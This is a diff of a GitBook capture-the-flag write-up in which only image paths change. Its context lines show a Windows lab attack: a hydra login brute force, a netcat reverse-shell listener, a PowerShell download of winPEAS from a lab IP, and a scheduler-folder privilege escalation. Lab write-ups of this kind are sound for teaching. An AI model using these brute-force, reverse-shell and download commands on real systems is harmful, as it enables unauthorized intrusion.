@@ -14,11 +14,11 @@
 
 Sent a failed login request to Burp to see what it would look like. With this info I was able to craft my request for hydra. I just needed to get the URL and everything that is sent after VIEWSTATE and just change the input to use ^USER^ and ^PASS^ to brute force these fields.
 
-<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I could also do this without burp by just opening the console and getting the info from there
 
-<figure><img src="../../.gitbook/assets/image (7) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```bash
@@ -54,7 +54,7 @@ rlwrap nc -lvnp 4445
 
 Upload the file
 
-<figure><img src="../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -128,9 +128,9 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233
 winPEASx64.exe
 ```
 
-``![](<../../.gitbook/assets/image (25) (1).png>)``
+``![](<../../.gitbook/assets/image (25) (1) (1).png>)``
 
-<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 cd C:\Program Files (x86)\SystemScheduler\Events
@@ -159,5 +159,5 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233
 
 <figure><img src="../../.gitbook/assets/image (16) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (8) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
